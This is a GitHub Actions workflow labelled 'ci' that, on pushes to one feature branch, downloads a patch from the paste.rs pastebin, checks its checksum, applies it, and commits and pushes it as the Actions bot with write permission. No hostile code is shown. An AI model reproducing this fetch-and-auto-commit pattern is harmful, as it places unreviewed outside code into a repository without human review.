name: ci

on:
  push:
    branches:
      - feature/bootstrap-architecture-v0.1

permissions:
  contents: write

jobs:
  apply-relationship-target-escape-hardening:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Download patch
        run: curl --fail --silent --show-error --location https://paste.rs/4AyBx --output security-relationship-target-escape.patch
      - name: Verify patch checksum
        run: echo "68082fff96607c224b354eff2b1fd945feab7f8513dc4790ec4c143960431ea9  security-relationship-target-escape.patch" | sha256sum --check -
      - name: Apply patch
        run: git apply --index security-relationship-target-escape.patch
      - name: Commit and push
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "test: reject malformed escaped relationship targets"
          git push
